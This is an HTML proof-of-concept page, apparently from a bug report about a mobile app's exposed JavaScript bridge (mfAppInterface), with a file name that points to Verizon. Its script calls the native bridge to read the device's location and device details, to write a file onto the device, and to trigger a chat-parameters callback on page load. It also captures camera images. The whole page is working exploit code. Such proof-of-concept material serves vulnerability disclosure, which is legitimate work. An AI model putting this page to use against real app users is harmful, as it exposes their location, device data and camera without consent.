<!DOCTYPE html>
<html>
<head>
  <title>PoC</title>
  <style>
    #output {
    word-wrap: break-word;       
    overflow-wrap: break-word;  
    white-space: normal;         
    width: 100%;              
    box-sizing: border-box;      
}
  </style>
</head>
<body>
<h1>PoC</h1>
  
  <button onclick="handleButton1()">Location</button>
<button onclick="handleButton2()">Device Info</button>
  <button onclick="handleButton3()">File Download</button>
  <div id="output"></div>
  
 <video id="video" autoplay playsinline style="width: 300px;"></video>
<canvas id="canvas" width="300" height="200" style="display:none;"></canvas>

<button id="snap">Take Photo</button>

<img id="capturedImage" style="width:300px; margin-top:10px;" />


<script>

 window.onload = function() {
            window.mfAppInterface.postMessage(JSON.stringify({"actionType":"beginChatParams","jsCallback":"getNativeInfo","AskvzTraceID":"1","key":null,"type":"log"}));
   
              };
  function handleButton1() {
    window.mfAppInterface.postMessage(JSON.stringify({actionType:"currentLatLng"}));
}

function handleButton2() {
    window.mfAppInterface.postMessage(JSON.stringify({actionType:"deviceDetails"}));
}

  function handleButton3() {
    window.mfAppInterface.postMessage(JSON.stringify({actionType: "downloadFile", byteData: "cG8gYyB3b3JrZWQ=",
                fileName: "verizonpoc.txt",
                mimeType: "txt",
                fileType: "document",
                type: "Save"}));
    getNativeInfo("File Downloaded");
}
  
function getNativeInfo(data) {
    
    const output = document.getElementById('output');
    if (output) {
        output.innerText = data;
    }
}
navigator.mediaDevices.getUserMedia({ video: true })
    .then((stream) => {
      const video = document.getElementById("video");
      video.srcObject = stream;

      const canvas = document.getElementById("canvas");
      const ctx = canvas.getContext("2d");
      const capturedImage = document.getElementById("capturedImage");


      document.getElementById("snap").addEventListener("click", () => {

        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);


        const dataUrl = canvas.toDataURL("image/png");


        capturedImage.src = dataUrl;

        stream.getTracks().forEach(track => track.stop());
      });
    })
    .catch((err) => {
      console.error("Camera error:", err);
    }); 
</script>

<div id="output"></div>
</body>
</html>
